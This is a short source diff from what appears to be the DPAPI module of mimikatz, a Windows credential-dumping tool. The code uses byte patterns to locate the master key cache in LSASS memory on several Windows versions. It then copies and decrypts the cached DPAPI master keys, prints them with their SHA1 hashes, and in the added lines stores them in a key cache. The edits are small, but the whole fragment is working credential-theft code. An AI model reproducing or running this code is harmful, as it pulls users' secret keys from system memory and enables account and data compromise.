@@ -26,7 +26,7 @@ BYTE PTRN_WALL_MasterKeyCacheList[]	= {0x33, 0xc0, 0x40, 0xa3};
 BYTE PTRN_WI60_MasterKeyCacheList[]	= {0x8b, 0xf0, 0x81, 0xfe, 0xcc, 0x06, 0x00, 0x00, 0x0f, 0x84};
 KULL_M_PATCH_GENERIC MasterKeyCacheReferences[] = {
 	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WALL_MasterKeyCacheList),	PTRN_WALL_MasterKeyCacheList},	{0, NULL}, {-4}},
-	{KULL_M_WIN_MIN_BUILD_8,	{sizeof(PTRN_WI60_MasterKeyCacheList),	PTRN_WI60_MasterKeyCacheList},	{0, NULL}, {-16}},
+	{KULL_M_WIN_MIN_BUILD_8,	{sizeof(PTRN_WI60_MasterKeyCacheList),	PTRN_WI60_MasterKeyCacheList},	{0, NULL}, {-16}},// ?
 	{KULL_M_WIN_MIN_BUILD_BLUE,	{sizeof(PTRN_WALL_MasterKeyCacheList),	PTRN_WALL_MasterKeyCacheList},	{0, NULL}, {-4}},
 };
 #endif
@@ -58,7 +58,7 @@ BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_dpapi(IN PKIWI_BASIC_SECURITY_LOGON_
 		{
 			aLsass.address = pMasterKeyCacheList;
 			if(kull_m_memory_copy(&aBuffer, &aLsass, sizeof(LIST_ENTRY)))
-			{	
+			{
 				aLsass.address = mesCredentials.Flink;
 				while(aLsass.address != pMasterKeyCacheList)
 				{
@@ -78,7 +78,10 @@ BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_dpapi(IN PKIWI_BASIC_SECURITY_LOGON_
 									(*pData->lsassLocalHelper->pLsaUnprotectMemory)(aKey.address, mesCredentials.keySize);
 									kprintf(L"\n\t * MasterKey :\t"); kull_m_string_wprintf_hex(aKey.address, mesCredentials.keySize, 0);
 									if(kull_m_crypto_hash(CALG_SHA1, aKey.address, mesCredentials.keySize, dgst, SHA_DIGEST_LENGTH))
+									{
 										kprintf(L"\n\t * sha1(key) :\t"); kull_m_string_wprintf_hex(dgst, SHA_DIGEST_LENGTH, 0);
+										kuhl_m_dpapi_oe_masterkey_add(&mesCredentials.KeyUid, dgst, SHA_DIGEST_LENGTH);
+									}
 								}
 								LocalFree(aKey.address);
 							}
